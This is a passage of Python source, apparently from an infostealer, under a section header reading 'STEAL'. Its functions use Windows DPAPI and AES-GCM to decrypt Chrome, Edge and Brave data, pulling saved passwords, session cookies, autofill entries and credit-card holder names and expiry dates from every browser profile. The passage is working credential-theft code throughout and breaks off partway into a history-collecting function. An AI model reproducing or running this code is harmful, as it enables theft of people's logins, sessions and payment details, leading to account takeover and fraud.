          # ============================================================
          #  STEAL
          # ============================================================
          def _dpapi(blob):
              import ctypes
              from ctypes import wintypes
              class BLOB(ctypes.Structure):
                  _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
              buf = ctypes.create_string_buffer(blob, len(blob))
              bi = BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))); bo = BLOB()
              if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
                  return b""
              out = ctypes.string_at(bo.pbData, bo.cbData)
              ctypes.windll.kernel32.LocalFree(bo.pbData); return out

          def _browsers():
              local = os.environ.get("LOCALAPPDATA", "")
              return [("Chrome", os.path.join(local, r"Google\Chrome\User Data")),
                      ("Edge",   os.path.join(local, r"Microsoft\Edge\User Data")),
                      ("Brave",  os.path.join(local, r"BraveSoftware\Brave-Browser\User Data"))]

          def _aes_key(base):
              ls = os.path.join(base, "Local State")
              if not os.path.exists(ls): return None
              try:
                  return _dpapi(base64.b64decode(json.load(open(ls, encoding="utf-8"))["os_crypt"]["encrypted_key"])[5:])
              except Exception: return None

          def f_browser():
              try:
                  from Crypto.Cipher import AES
              except Exception: return "Thiếu pycryptodome"
              import sqlite3
              lines = []
              for name, base in _browsers():
                  key = _aes_key(base)
                  if not key: continue
                  for prof in os.listdir(base):
                      db = os.path.join(base, prof, "Login Data")
                      if not os.path.exists(db): continue
                      tmp = os.path.join(tempfile.gettempdir(), "ld_"+prof+".db")
                      try: shutil.copy2(db, tmp)
                      except Exception: continue
                      try:
                          con = sqlite3.connect(tmp); cur = con.cursor()
                          cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                          for url, user, pw in cur.fetchall():
                              if not pw: continue
                              try:
                                  if pw[:3] == b"v10":
                                      d = AES.new(key, AES.MODE_GCM, pw[3:15]).decrypt(pw[15:])[:-16].decode("utf-8","ignore")
                                  else: d = _dpapi(pw).decode("utf-8","ignore")
                              except Exception: d = "(?)"
                              lines.append(f"[{name}/{prof}] {url} | {user} | {d}")
                          con.close()
                      except Exception: pass
              return "\n".join(lines[:300]) or "Không đọc được"

          def f_cookies():
              try:
                  from Crypto.Cipher import AES
              except Exception: return "Thiếu pycryptodome"
              import sqlite3
              lines = []
              for name, base in _browsers():
                  key = _aes_key(base)
                  if not key: continue
                  for prof in os.listdir(base):
                      db = os.path.join(base, prof, "Network", "Cookies")
                      if not os.path.exists(db): continue
                      tmp = os.path.join(tempfile.gettempdir(), "ck_"+prof+".db")
                      try: shutil.copy2(db, tmp)
                      except Exception: continue
                      try:
                          con = sqlite3.connect(tmp); cur = con.cursor()
                          cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                          for host, cn, ev in cur.fetchall():
                              try:
                                  if ev[:3] == b"v10":
                                      val = AES.new(key, AES.MODE_GCM, ev[3:15]).decrypt(ev[15:])[:-16].decode("utf-8","ignore")
                                  else: val = _dpapi(ev).decode("utf-8","ignore")
                              except Exception: continue
                              if val: lines.append(f"{host}\t{cn}\t{val}")
                          con.close()
                      except Exception: pass
              return "\n".join(lines[:600]) or "Không có cookie"

          def f_autofill():
              import sqlite3
              lines = []
              for name, base in _browsers():
                  if not os.path.isdir(base): continue
                  for prof in os.listdir(base):
                      db = os.path.join(base, prof, "Web Data")
                      if not os.path.exists(db): continue
                      tmp = os.path.join(tempfile.gettempdir(), "wd_"+prof+".db")
                      try: shutil.copy2(db, tmp)
                      except Exception: continue
                      try:
                          con = sqlite3.connect(tmp); cur = con.cursor()
                          cur.execute("SELECT name, value FROM autofill")
                          for n, v in cur.fetchall(): lines.append(f"[{name}] {n}: {v}")
                          cur.execute("SELECT name_on_card, expiration_month, expiration_year FROM credit_cards")
                          for nc, em, ey in cur.fetchall(): lines.append(f"[{name}] 💳 {nc} {em}/{ey}")
                          con.close()
                      except Exception: pass
              return "\n".join(lines[:400]) or "Không có autofill"

          def f_history(n=60):
